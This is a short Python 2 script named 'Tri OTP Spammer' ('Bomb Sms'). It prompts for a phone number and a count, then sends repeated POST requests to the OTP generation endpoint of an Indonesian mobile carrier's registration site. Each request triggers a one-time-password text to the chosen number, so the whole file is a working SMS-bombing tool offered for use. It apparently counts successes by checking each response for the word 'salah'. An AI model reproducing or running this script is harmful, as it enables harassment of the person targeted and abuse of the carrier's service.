from requests import get,post
__banner__="""
  	########################
  	[   Tri OTP Spammer    ]
  	[       Bomb Sms       ]
  	[   Coded By Krishna   ]
  	########################
"""
print __banner__
class spammerTri():
	def __init__(self):
		self.reqUri="https://registrasi.tri.co.id/daftar/generateOTP"
		self.reqPayload={"msisdn":raw_input('phone : ')}
		self.reqCount=int(input('count : '))
		print("started ...")
		self.sendRequests()
	def sendRequests(self):
		for self.jumlah in range(self.reqCount):
			self.sendPayloads=post(self.reqUri,data=self.reqPayload).text
			if "salah" in self.sendPayloads:
				print("requests send failed.")
			else:
				print("requests send success.")
		print("finished.")
spammerTri()